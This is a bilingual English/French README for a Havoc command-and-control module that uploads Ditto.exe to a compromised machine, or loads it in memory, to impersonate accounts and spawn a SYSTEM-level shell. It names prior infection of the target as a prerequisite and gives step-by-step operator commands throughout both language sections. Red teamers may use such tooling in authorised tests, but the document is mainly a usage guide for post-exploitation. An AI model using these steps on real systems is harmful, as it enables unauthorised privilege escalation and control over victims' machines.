# Havoc_impersonate

**language**
1. [EN](#en)
2. [FR](#fr)

## EN

1. [Description](#description)
2. [Installation](#installation)
3. [Usage-guide](#usage-guide)
    1. [Prerequisites](#prerequisites)
    2. [type-upload](#upload)
        - [set-Executable-local-file](#step-1)
        - [use-module](#step-2)
    3. [type-memory](#in-memory)
        - [set-Executable-local-file](#step-1-1)
        - [use-module](#step-2-1)


### Description

The Havoc_impersonate module directly integrates impersonation functionality into Havoc.

This script utilizes three binary files. Two of these files are copies of objects from the NoConsoolation module. The third file is Ditto.exe, which performs the impersonation. We thank @LeDocteurDesBits (https://github.com/LeDocteurDesBits/Ditto) for his repository.

This module allows uploading Ditto.exe (or another file) to the target machine or executing the executable directly in memory.

### Installation

1. Install Python dependencies:
```bash
pip install argparse 
```

2. Clone the repository:
```bash
git clone https://github.com/MaldExE/Havoc_impersonnate.git
```

After cloning, open your Havoc client.

3. Click on the "Script" tab and open the script manager window.

![alt text](img/image1.png)

4. Click "Load Script", choose the impersonnate.py file, and open it.

![alt text](img/image2.png)
![alt text](img/image3.png)

A line will appear in the script manager tab, indicating that the script has been loaded into Havoc.

### Usage Guide
#### Prerequisites

You must have infected your target and have a privileged account before using this module.

![alt text](img/image.png)

#### Upload
##### Step 1

This command is used to set the local file to be uploaded to your target. The uploaded file take your id session havoc to name it.

```
Ditto-upload SetExecutableFile ~/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```
![alt text](img/image4.png)

##### Step 2

**To obtain a system shell:**

```
Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```
![alt text](img/image5.png)

**To execute a custom command for Ditto or other executble:**
!!! Warning !!!
the option -h or --help was interpreted by havoc and craching my module

```
Ditto-upload Exec help
```

![alt text](img/image6.png)

#### In Memory
##### Step 1

```
Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

##### Step 2

**To obtain a system shell:**

```
Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```


**To execute a custom command for Ditto:**
!!! Warning !!!
the option -h or --help was interprete by havoc and craching my module

```
Ditto-Memory Exec help
```


## FR

1. [Description](#description-1)
2. [Installation](#installation-1)
3. [guide-utilisation](#guide-dutilisation)
    1. [préréquis](#prérequis)
    2. [Mode-upload](#upload-1)
        - [Définir-Executable-locale](#étape-1)
        - [utilisation-du-module](#étape-2)
    3. [Mode-en-mêmoire](#en-mémoire)
        - [Définir-Executable-locale](#étape-1-1)
        - [utilisation-du-module](#étape-2-1)

### Description

Le module Havoc_impersonnate intègre directement la fonctionnalité d'usurpation d'identité dans Havoc.

Le script utilise trois fichiers binaires. Deux de ces fichiers sont des copies d'objets provenant du module NoConsoolation. Le troisième fichier est Ditto.exe, qui effectue l'usurpation d'identité. Nous remercions @LeDocteurDesBits (https://github.com/LeDocteurDesBits/Ditto) pour son dépôt.

Ce module permet de télécharger Ditto.exe (ou un autre fichier) sur la machine cible ou d'exécuter directement l'exécutable en mémoire.

### Installation

1. Installez les dépendances Python :
```bash
pip install argparse 
```

2. Clonez le dépôt :
```bash
git clone https://github.com/MaldExE/Havoc_impersonnate.git
```

Après le clonage, ouvrez votre client Havoc.

3. Cliquez sur l'onglet "Script" et ouvrez la fenêtre du gestionnaire de scripts.

![alt text](img/image1.png)

4. Cliquez sur "Load Script", choisissez le fichier impersonnate.py et ouvrez-le.

![alt text](img/image2.png)
![alt text](img/image3.png)

Une ligne apparaîtra dans l'onglet du gestionnaire de scripts, indiquant que le script a été chargé dans Havoc.

### Guide d'utilisation
#### Prérequis

Vous devez avoir infecté votre cible et disposer d'un compte privilégié avant d'utiliser ce module.

![alt text](img/image.png)

#### Upload
##### Étape 1

Cette commande est utilisée pour définir le fichier local à télécharger sur votre cible. Le fichier uploader prendra le nom de votre session Havoc.

```
Ditto-upload SetExecutableFile ~/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```
![alt text](img/image4.png)

##### Étape 2

**Pour obtenir un shell système :**
```
Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```
![alt text](img/image5.png)

**Pour exécuter une commande personnalisée pour Ditto :**
```
Ditto-upload Exec help
```
![alt text](img/image6.png)

#### En mémoire
##### Étape 1

Cette commande est utilisée pour définir le fichier local à télécharger sur votre cible. L'upload nécessite l'ID de votre session.

```
Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

##### Étape 2

Pour obtenir un shell système :
```
Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```


Pour exécuter une commande personnalisée pour Ditto :
```
Ditto-Memory Exec help
```